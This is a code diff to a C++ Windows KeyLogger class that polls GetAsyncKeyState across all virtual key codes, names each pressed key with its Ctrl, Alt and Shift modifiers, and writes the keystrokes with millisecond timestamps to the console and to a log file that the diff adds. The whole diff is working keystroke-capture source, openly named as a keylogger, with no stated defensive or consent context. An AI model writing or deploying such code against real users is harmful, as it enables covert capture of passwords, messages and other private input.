@@ -1,7 +1,23 @@
 #include "keylog.h"
+#include <spdlog/spdlog.h>
 
-std::string KeyLogger::GetKeyName(int vkCode, bool shiftPressed, bool capsLock)
-{
+KeyLogger::KeyLogger(const std::string& filePath) : running(true) {
+  logFile = fopen(filePath.c_str(), "w"); // Open file in write mode
+  if (!logFile) {
+    spdlog::error("Failed to open log file: {}", filePath);
+  } else {
+    spdlog::info("Logging to file: {}", filePath);
+  }
+}
+
+KeyLogger::~KeyLogger() {
+  if (logFile) {
+    fclose(logFile);
+    logFile = nullptr;
+  }
+}
+
+std::string KeyLogger::GetKeyName(int vkCode, bool shiftPressed, bool capsLock) {
   std::string result;
 
   if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers
@@ -78,8 +94,7 @@ std::string KeyLogger::GetKeyName(int vkCode, bool shiftPressed, bool capsLock)
   return result;
 }
 
-void KeyLogger::StartLogging()
-{
+void KeyLogger::StartLogging() {
   SHORT lastState[256] = {0};
   auto startTime = std::chrono::system_clock::now();
 
@@ -92,7 +107,6 @@ void KeyLogger::StartLogging()
     for (int vkCode = 0x01; vkCode <= 0xFE; vkCode++) {
       SHORT currentState = GetAsyncKeyState(vkCode);
 
-      // Check for key press (transition from up to down)
       if ((currentState & 0x8000) && !(lastState[vkCode] & 0x8000)) {
         std::string keyName = GetKeyName(vkCode, shiftPressed, capsLock);
 
@@ -103,19 +117,17 @@ void KeyLogger::StartLogging()
           modifiers += "[ALT]+";
         if (shiftPressed)
           modifiers += "[SHIFT]+";
-        if (modifiers.size() > 0)
-          modifiers = modifiers.substr(0, modifiers.size() - 1) + " ";
 
         std::lock_guard<std::mutex> lock(logMutex);
         std::string logEntry = modifiers + keyName;
 
+        // Log to console
         spdlog::info("Key: {}", logEntry);
+
+        // Log to file if open
         if (logFile) {
           auto now = std::chrono::system_clock::now();
-          auto timestamp =
-              std::chrono::duration_cast<std::chrono::milliseconds>(now -
-                                                                    startTime)
-                  .count();
+          auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(now - startTime).count();
           fprintf(logFile, "[%lld ms] %s\n", timestamp, logEntry.c_str());
           fflush(logFile);
         }
@@ -123,7 +135,6 @@ void KeyLogger::StartLogging()
       lastState[vkCode] = currentState;
     }
 
-    // Prevent CPU hogging
     std::this_thread::sleep_for(std::chrono::milliseconds(1));
   }
 }
